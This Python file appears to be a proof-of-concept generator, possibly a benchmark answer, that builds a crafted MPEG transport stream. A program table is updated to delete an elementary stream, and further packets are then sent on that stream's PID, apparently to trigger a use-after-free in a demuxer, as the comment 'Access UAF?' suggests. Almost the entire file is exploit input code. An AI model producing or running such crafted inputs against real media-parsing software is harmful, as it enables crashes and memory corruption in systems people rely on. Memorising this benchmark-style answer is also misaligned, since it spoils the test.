import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    carry = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if carry ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def make_packet(pid, payload, cc, pusi=False):
            # Header: Sync(8) | TEI(1) PUSI(1) PRIO(1) PID(13) | SCR(2) AFC(2) CC(4)
            # Sync: 0x47
            header_val = 0x47000000
            
            if pusi:
                header_val |= 0x400000
            
            header_val |= (pid & 0x1FFF) << 8
            
            # Adaptation 01 (Payload only) = 0x10. 
            header_val |= 0x10 
            
            header_val |= (cc & 0x0F)
            
            pkt_header = struct.pack('>I', header_val)
            
            content = payload
            if len(content) < 184:
                content += b'\xff' * (184 - len(content))
            
            return pkt_header + content[:184]

        packets = []
        
        # Constants
        PAT_PID = 0
        PMT_PID = 0x100
        ES_PID = 0x200
        
        # --- Packet 1: PAT ---
        # Defines Program 1 at PID 0x100
        pat_section = bytearray()
        pat_section.append(0x00) # Table ID (PAT)
        pat_section.extend(b'\xB0\x0D') # Section Length
        pat_section.extend(b'\x00\x01') # TS ID
        pat_section.append(0xC1) # Ver 0, Cur
        pat_section.append(0x00) 
        pat_section.append(0x00)
        
        pat_section.extend(b'\x00\x01') # Prog 1
        pat_section.extend(struct.pack('>H', 0xE000 | PMT_PID)) # PID 0x100
        
        crc = mpeg_crc32(pat_section)
        pat_section.extend(struct.pack('>I', crc))
        
        # Add pointer field 0 for PUSI
        packets.append(make_packet(PAT_PID, b'\x00' + pat_section, 0, pusi=True))
        
        # --- Packet 2: PMT (Ver 0) ---
        # Defines ES at PID 0x200
        pmt_section = bytearray()
        pmt_section.append(0x02) # Table ID
        pmt_section.extend(b'\xB0\x12') # Length
        pmt_section.extend(b'\x00\x01') # Prog 1
        pmt_section.append(0xC1) # Ver 0
        pmt_section.append(0x00)
        pmt_section.append(0x00)
        pmt_section.extend(b'\xFF\xFF') # PCR PID
        pmt_section.extend(b'\xF0\x00') # Prog Info
        
        pmt_section.append(0x06) # Type PES (Private)
        pmt_section.extend(struct.pack('>H', 0xE000 | ES_PID))
        pmt_section.extend(b'\xF0\x00')
        
        crc = mpeg_crc32(pmt_section)
        pmt_section.extend(struct.pack('>I', crc))
        
        packets.append(make_packet(PMT_PID, b'\x00' + pmt_section, 0, pusi=True))
        
        # --- Packet 3: Data (ES_PID) ---
        # Start PES - sets up state
        pes_data = b'\x00\x00\x01\xE0\x00\x00' + b'\xAA'*100
        packets.append(make_packet(ES_PID, pes_data, 0, pusi=True))
        
        # --- Packet 4: PMT (Ver 1) - Delete ES ---
        pmt2_section = bytearray()
        pmt2_section.append(0x02)
        pmt2_section.extend(b'\xB0\x0D') # Length
        pmt2_section.extend(b'\x00\x01')
        pmt2_section.append(0xC3) # Ver 1 (11 000 0 1 1) -> C3
        pmt2_section.append(0x00)
        pmt2_section.append(0x00)
        pmt2_section.extend(b'\xFF\xFF')
        pmt2_section.extend(b'\xF0\x00')
        # No streams
        
        crc = mpeg_crc32(pmt2_section)
        pmt2_section.extend(struct.pack('>I', crc))
        
        packets.append(make_packet(PMT_PID, b'\x00' + pmt2_section, 1, pusi=True))
        
        # --- Packet 5: Data (ES_PID) - Continuation ---
        # Access UAF?
        packets.append(make_packet(ES_PID, b'\xBB'*184, 1, pusi=False))
        
        # --- Packet 6: Data (ES_PID) - More ---
        packets.append(make_packet(ES_PID, b'\xCC'*184, 2, pusi=False))
        
        return b''.join(packets)
